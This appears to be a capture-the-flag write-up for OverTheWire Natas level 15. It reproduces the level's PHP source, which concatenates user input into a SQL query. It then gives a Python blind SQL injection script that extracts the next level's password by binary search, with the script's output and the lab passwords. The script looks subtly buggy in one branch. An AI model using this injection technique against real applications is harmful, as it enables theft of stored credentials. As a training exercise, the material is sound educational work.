# Natas Level 15
```bash
Username: natas15
Password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
URL:      http://natas15.natas.labs.overthewire.org
```
We enter the site, and see the following page:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas15.png" />
    <div align="center">Natas 15</div>
</figure>

Clicking on the "View sourcecode" link:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas15-view-sourcecode.png" />
    <div align="center">Natas 15 - View sourcecode</div>
</figure>

The code is:

```php
/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas15', '<censored>'); 
    mysql_select_db('natas15', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
        if(mysql_num_rows($res) > 0) { 
            echo "This user exists.<br>"; 
        } else { 
            echo "This user doesn't exist.<br>"; 
        } 
    } else { 
        echo "Error in query.<br>"; 
    } 

    mysql_close($link); 
} else { 
```

The problem is that we only get to know if rows are returned (and not the actual output).

We must use [blind SQL injection](https://www.owasp.org/index.php/Blind_SQL_Injection)

Lets check out the following python script:

```python
import requests
import string

URL = "http://natas15.natas.labs.overthewire.org/index.php?username=natas16\" and SUBSTR(password, %d, 1) &gt;= binary \"%s\" -- "
auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

password = ''
c = string.digits + string.ascii_uppercase + string.ascii_lowercase

while len(password) &lt; 32:
    i = 0
    j = len(c)-1

    while True:
        r = requests.get(URL % (len(password)+1, c[(i + j) // 2]), auth=auth)

        if abs(j - i) < 2:
            if "This user exists" in requests.get(URL % (len(password)+1, c[j]), auth=auth):
                password += c[j]
            else:
                password += c[i]
                print password + "*" * (32 - len(password))
                break

        if "This user exists" in r.content:
            i = (i + j) // 2
        else:
            j = (i + j) // 2

print "Password for natas16 is:", password
```

Using binary search to steal the password char by char.

We get the output:
```bash
W*******************************
Wa******************************
WaI*****************************
WaIH****************************
WaIHE***************************
WaIHEa**************************
WaIHEac*************************
WaIHEacj************************
WaIHEacj6***********************
WaIHEacj63**********************
WaIHEacj63w*********************
WaIHEacj63wn********************
WaIHEacj63wnN*******************
WaIHEacj63wnNI******************
WaIHEacj63wnNIB*****************
WaIHEacj63wnNIBR****************
WaIHEacj63wnNIBRO***************
WaIHEacj63wnNIBROH**************
WaIHEacj63wnNIBROHe*************
WaIHEacj63wnNIBROHeq************
WaIHEacj63wnNIBROHeqi***********
WaIHEacj63wnNIBROHeqi3**********
WaIHEacj63wnNIBROHeqi3p*********
WaIHEacj63wnNIBROHeqi3p9********
WaIHEacj63wnNIBROHeqi3p9t*******
WaIHEacj63wnNIBROHeqi3p9t0******
WaIHEacj63wnNIBROHeqi3p9t0m*****
WaIHEacj63wnNIBROHeqi3p9t0m5****
WaIHEacj63wnNIBROHeqi3p9t0m5n***
WaIHEacj63wnNIBROHeqi3p9t0m5nh**
WaIHEacj63wnNIBROHeqi3p9t0m5nhm*
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
Password for natas16 is: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```

We got the password for the next level: **WaIHEacj63wnNIBROHeqi3p9t0m5nhmh**